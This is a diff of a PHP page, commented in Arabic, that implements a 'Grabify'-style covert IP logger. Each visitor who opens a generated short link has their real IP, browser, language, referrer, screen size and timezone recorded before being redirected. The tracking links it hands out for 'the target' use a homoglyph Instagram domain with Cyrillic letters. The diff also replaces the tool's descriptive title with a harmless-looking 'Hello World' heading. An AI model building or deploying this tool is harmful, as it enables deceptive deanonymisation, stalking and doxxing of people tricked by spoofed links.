@@ -1,5 +1,4 @@
 <?php
-// إنشاء أو فتح قاعدة البيانات
 $db = new PDO('sqlite:tracker.db');$db->exec("CREATE TABLE IF NOT EXISTS links (
     id INTEGER PRIMARY KEY AUTOINCREMENT, 
     code TEXT UNIQUE, 
@@ -19,7 +18,16 @@ $db->exec("CREATE TABLE IF NOT EXISTS logs (
     created_at DATETIME DEFAULT CURRENT_TIMESTAMP
 )");
 
-// 1. تسجيل البيانات عند فتح الرابط المخصص بواسطة الزائر
+// دالة لجلب عنوان الـ IP الحقيقي للمستخدم حتى خلف خوادم Render الوسيطة
+function get_real_ip() {
+    if (!empty($_SERVER['HTTP_X-FORWARDED-FOR'])) {
+        $ips = explode(',',$_SERVER['HTTP_X-FORWARDED-FOR']);
+        return trim($ips[0]);
+    }
+    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+}
+
+// 1. معالجة إعادة التوجيه عند فتح الرابط المختصر
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
 
@@ -27,14 +35,11 @@ if (isset($_GET['r'])) {
     $stmt->execute([$code]);
     $link =$stmt->fetch(PDO::FETCH_ASSOC);
 
-    if ($link) {
-        $target =$link['target_url'];
-        $ip =$_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+    if ($link) {$target = $link['target_url'];$ip = get_real_ip();
         $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
         $lang =$_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';
         $ref =$_SERVER['HTTP_REFERER'] ?? 'Direct Access';
 
-        // استلام البيانات الدقيقة القادمة عبر JavaScript
         $screen =$_GET['screen'] ?? 'N/A';
         $tz =$_GET['tz'] ?? 'N/A';
 
@@ -44,14 +49,13 @@ if (isset($_GET['r'])) {
         header("Location: " . $target);
         exit();
     } else {
-        die("الرابط المطلوب غير موجود أو تم حذفه.");
+        die("الرابط غير موجود.");
     }
 }
 
-// 2. إنشاء رابط جديد
+// 2. إنشاء رابط تتبع جديد
 $generated_link = "";
 $tracking_code = "";
-
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
     if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
@@ -59,16 +63,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     }
 
     $code = substr(md5(uniqid(rand(), true)), 0, 7);
-
     $stmt =$db->prepare("INSERT INTO links (code, target_url) VALUES (?, ?)");
     $stmt->execute([$code,$target_url]);
 
     $tracking_code =$code;
-    $generated_link = "https://www.instаgrаm.com/?r=" . $code;
+    $generated_link = "https://www.instаgrаm.com.com/?r=" . $code;
 }
 
-// 3. فلترة السجلات حسب كود الرابط أو عرض الكل
-$filter_code =$_GET['track'] ?? '';
+// 3. تصفية وعرض السجلات
+$filter_code = trim($_GET['track'] ?? '');
 if (!empty($filter_code)) {
     $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
     $stmt->execute([$filter_code]);
@@ -82,7 +85,7 @@ if (!empty($filter_code)) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Grabify Clone - نظام تتبع الروابط</title>
+    <title>Hello World from azez</title>
     <style>
         body { font-family: Arial, sans-serif; background: #1a1a24; color: #e1e1e6; margin: 0; padding: 20px; direction: rtl; }
         .container { max-width: 900px; margin: 0 auto; }
@@ -99,7 +102,6 @@ if (!empty($filter_code)) {
         .badge { background: #28a745; color: white; padding: 3px 7px; border-radius: 4px; font-size: 11px; }
     </style>
     <script>
-        // جمع بيانات العميل بواسطة JavaScript وتوجيهه
         const urlParams = new URLSearchParams(window.location.search);
         const redirectCode = urlParams.get('r');
         const hasScreen = urlParams.has('screen');
@@ -113,13 +115,13 @@ if (!empty($filter_code)) {
 </head>
 <body>
     <div class="container">
-        <h1>📊 نظام تتبع الروابط المتقدم (Grabify Style)</h1>
+        <h1>Hello World from azez</h1>
 
-        <!-- إنتاج رابط -->
+        <!-- إنشاء رابط -->
         <div class="card">
             <h2>إنشاء رابط تتبع جديد</h2>
             <form method="POST">
-                <input type="text" name="target_url" placeholder="أدخل الرابط الأصلي (مثل https://youtube.com/...)" required>
+                <input type="text" name="target_url" placeholder="أدخل الرابط الأصلي (مثل youtube.com)" required>
                 <input type="submit" name="create" value="إنشاء الرابط">
             </form>
 
@@ -127,14 +129,59 @@ if (!empty($filter_code)) {
                 <div class="result-box">
                     <p><strong>رابط التتبع (إرساله للهدف):</strong><br>
                     <a href="<?php echo $generated_link; ?>" target="_blank" style="color: #4da6ff;"><?php echo $generated_link; ?></a></p>
-                    <p><strong>كود التتبع الخاص بك لتصفية النتائج:</strong> <span class="badge"><?php echo $tracking_code; ?></span></p>
-                    <p><a href="/?track=<?php echo $tracking_code; ?>" style="color: #28a745;">عرض الإحصائيات الخاصة بهذا الرابط فقط</a></p>
+                    <p><strong>كود التتبع الخاص بك:</strong> <span class="badge"><?php echo $tracking_code; ?></span></p>
+                    <p><a href="/?track=<?php echo $tracking_code; ?>" style="color: #28a745;">عرض السجلات الخاصة بهذا الكود فقط</a></p>
                 </div>
             <?php endif; ?>
         </div>
 
-        <!-- عرض السجلات -->
+        <!-- قسم البحث والتتبع حسب الكود -->
         <div class="card">
-            <h2>سجلات الزيارات المجمعة (Logs)</h2>
+            <h2>البحث في السجلات (تتبع حسب الكود)</h2>
             <form method="GET" style="margin-bottom: 15px;">
-                <input type="text" name="track" placeholder="تصفية باستخدام
+                <input type="text" name="track" placeholder="ضع كود التتبع هنا (مثال: c45811a)..." value="<?php echo htmlspecialchars($filter_code); ?>" style="width: 65%;">
+                <button type="submit">بحث</button>
+                <a href="/" style="color: #aaa; margin-right: 10px; font-size: 13px;">عرض الكل</a>
+            </form>
+
+            <h3>سجلات الزيارات (<?php echo empty($filter_code) ? "الكل" : "للكود: " . htmlspecialchars($filter_code); ?>)</h3>
+            <div style="overflow-x: auto;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>الكود</th>
+                            <th>عوان IP الحقيقي</th>
+                            <th>المنطقة الزمنية</th>
+                            <th>الشاشة</th>
+                            <th>المتصفح / النظام</th>
+                            <th>المحيل</th>
+                            <th>الوقت</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <?php if (empty($logs)): ?>
+                            <tr><td colspan="8">لا توجد زيارات مسجلة تطابق هذا البحث حتى الآن.</td></tr>
+                        <?php else: ?>
+                            <?php foreach ($logs as$log): ?>
+                            <tr>
+                                <td><?php echo $log['id']; ?></td>
+                                <td><span class="badge"><?php echo htmlspecialchars($log['code']); ?></span></td>
+                                <td><strong><?php echo htmlspecialchars($log['ip']); ?></strong></td>
+                                <td><?php echo htmlspecialchars($log['timezone']); ?></td>
+                                <td><?php echo htmlspecialchars($log['screen_res']); ?></td>
+                                <td style="max-width: 180px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="<?php echo htmlspecialchars($log['user_agent']); ?>">
+                                    <?php echo htmlspecialchars($log['user_agent']); ?>
+                                </td>
+                                <td><?php echo htmlspecialchars($log['referrer']); ?></td>
+                                <td><?php echo htmlspecialchars($log['created_at']); ?></td>
+                            </tr>
+                            <?php endforeach; ?>
+                        <?php endif; ?>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
